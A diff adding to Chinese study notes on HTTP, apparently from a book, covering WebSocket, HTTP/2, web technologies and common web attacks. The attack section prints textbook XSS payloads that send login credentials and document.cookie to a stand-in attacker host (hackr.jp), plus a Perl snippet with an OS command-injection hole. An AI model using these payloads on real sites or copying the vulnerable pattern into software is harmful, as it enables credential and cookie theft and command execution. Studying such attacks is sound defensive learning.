@@ -695,5 +695,85 @@ OPTIONS * HTTP/1.1
        5. 服务器提示功能
 4. WebSocket
     1. web浏览器和web服务器之间的全双工通信标准
-5. 
+    2. 服务器与客户端建立起websocket协议通信连接后，可相互发送JSON, XML, HTML或图片等任意格式的数据
+    3. WebSocket的主要特点
+        1. 推送功能， 服务器不必等待客户端的请求，直接发送数据
+        2. 减少通信量，websocket的首部信息很小，通信量也相应减少了
+        3. 实现WebSocket通信，需要在HTTP建立连接后，完成1次握手的步骤
+            * 握手-请求
+            * 握手-响应
+    4. example
+        ```js
+        var socket = new WebSocket('ws://game.example.com:12010/updates');
+        socket.onopen = function () {
+            setInterval(function() {
+                if (socket.bufferedAmount == 0) {
+                    socket.send(getUpdateData());
+                }
+            }, 50);
+        };
+        ```
+    5. ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/websocket.png?raw=true)
+5. HTTP2.0
+    1. 改善用户在使用web时的速度体验
 
+## 六、构建web内容的技术
+1. web页面几乎全由HTML构建
+2. CSS，使文档的结构和设计分离
+3. DOM是用以操作HTML文档和XML文档的API
+4. CGI（common gateway interface, 通用网关接口）是指web服务器在接收到客户端发送过来的请求后转发给程序的一组机制
+5. CGI程序通常用Perl, php, ruby, c等编程语言编写而成
+6. servlet是用java实现的，一种能在服务器上创建动态内容的程序
+
+## 七、针对web的攻击技术
+1. HTTP不具备必要的安全功能
+2. 在客户端可篡改请求
+    * 在HTTP请求报文内加载攻击代码
+    * 通过URL查询字段或表单、HTTP首部、Cookie等途径把攻击代码传入
+3. 攻击模式
+    1. 主动攻击
+        * SQL注入攻击
+        * OS命令注入攻击
+    2. 被动攻击
+        1. 设计好陷阱，陷阱会触发嵌入攻击代码的HTTP请求
+        2. 用户的浏览器或邮件系统触发这个陷阱
+        3. 用户把含有攻击代码的HTTP请求发送给作为攻击目标的web应用，执行攻击代码
+        4. web应用成为攻击者的跳板，导致用户的cookie个人信息被窃取，登录状态的用户权限被恶意滥用
+        5. ![](https://github.com/bearnew/picture/blob/master/mardown/2018-12-20%20http%E8%AF%BB%E5%90%8E%E6%84%9F/%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB.png?raw=true)
+4. 输出值转义不完全引发的安全漏洞
+    1. 客户端的验证并不能作为安全防范对策，只能起到尽早辨识错误，提高UI体验的作用
+    2. 跨站脚本攻击（XSS）
+        1. 对用户登陆信息进行获取
+        ```js
+        // 用户点击此url到网页，在表单内输入ID和密码后，直接发送给了攻击者的网站
+        "http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s=""
+        ```
+        ```html
+        <div class="logo">
+            <img src="/img/logo.gif" alt="E! 拍卖会" />
+            </div>
+            <form action="http://example.jp/login" method="post" id="login">
+            <div class="input_id">
+            ID <input type="text" name="ID" value="yama" />
+        </div>
+        ```
+        2. 对用户的cookie进行窃取攻击
+        ```html
+        <script src=http://hackr.jp/xss.js></script>
+        ```
+        ```js
+        // 访问web域名下的cookie信息，然后将信息发送给攻击者的网站（http://hackr.jp/?），记录到了攻击者的日志中
+        var content = escape(document.cookie);
+        document.write("<img src=http://hackr.jp/?");
+        document.write(content);
+        document.write(">");
+        ```
+    3. SQL注入攻击
+        * 使用SQL语句作为查询条件，请求HTTP服务器，执行数据库操作，导致数据库信息被非法浏览或者篡改
+    4. OS命令注入攻击
+        * 通过web应用，执行非法的操作系统命令达到攻击的目的
+        ```shell
+        my $adr = $q->param('mailaddress');
+        open(MAIL, "| /usr/sbin/sendmail $adr");
+        print MAIL "From: info@example.com\n";
+        ```
